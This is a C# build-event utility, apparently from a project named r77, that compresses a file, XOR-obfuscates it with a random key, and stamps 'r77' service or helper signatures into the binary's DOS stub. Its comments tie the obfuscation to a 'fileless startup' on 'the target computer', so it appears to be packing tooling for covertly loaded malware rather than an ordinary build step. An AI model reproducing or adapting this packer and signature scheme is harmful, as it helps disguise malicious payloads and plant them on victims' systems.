using Global;
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;

namespace BuildTask
{
	/// <summary>
	/// BuildTask.exe is used for VS build events.
	/// <para>The first argument is a path to the file to be processed</para>
	/// <para>-compress: Compress file</para>
	/// <para>-encrypt: Encrypt file</para>
	/// <para>-r77service: Write R77_SERVICE_SIGNATURE to r77 header</para>
	/// <para>-r77helper: Write R77_HELPER_SIGNATURE to r77 header</para>
	/// </summary>
	public static class Program
	{
		public static int Main(string[] args)
		{
			if (args.Length == 0) return 1;
			if (!File.Exists(args[0])) return 1;

			byte[] file = File.ReadAllBytes(args[0]);
			if (args.Contains("-compress")) file = Compress(file);
			if (args.Contains("-encrypt")) file = Encrypt(file);
			if (args.Contains("-r77service")) file = R77Signature(file, Config.R77ServiceSignature);
			if (args.Contains("-r77helper")) file = R77Signature(file, Config.R77HelperSignature);

			File.WriteAllBytes(args[0], file);
			return 0;
		}

		private static byte[] Compress(byte[] data)
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
				{
					gzipStream.Write(data, 0, data.Length);
				}

				return memoryStream.ToArray();
			}
		}
		private static byte[] Encrypt(byte[] data)
		{
			// Only a trivial encryption algorithm is used.
			// This improves the stability of the fileless startup, because less .NET classes are imported that may not be present on the target computer.

			byte[] encrypted = new byte[data.Length + 4];
			RandomNumberGenerator.Create().GetBytes(encrypted, 0, 4);

			int key = BitConverter.ToInt32(encrypted, 0);

			for (int i = 0; i < data.Length; i++)
			{
				encrypted[i + 4] = (byte)(data[i] ^ (byte)key);
				key = key << 1 | key >> (32 - 1);
			}

			return encrypted;
		}
		private static byte[] R77Signature(byte[] file, ushort signature)
		{
			// Write a 16-bit signature to the r77 header.
			byte[] newFile = file.ToArray();
			Buffer.BlockCopy(BitConverter.GetBytes(signature), 0, newFile, 64, 2); // The offset of the DOS stub is 64.
			return newFile;
		}
	}
}